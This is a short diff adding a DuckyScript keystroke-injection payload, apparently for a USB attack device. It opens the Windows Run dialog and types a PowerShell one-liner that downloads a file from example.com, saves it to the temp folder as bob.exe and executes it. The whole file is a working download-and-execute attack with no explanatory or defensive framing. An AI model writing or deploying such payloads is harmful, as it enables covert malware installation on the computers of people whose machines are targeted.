@@ -1,0 +1,4 @@
+GUI r
+DELAY 100
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe'); Start-Process "%TEMP%\bob.exe"
+ENTER
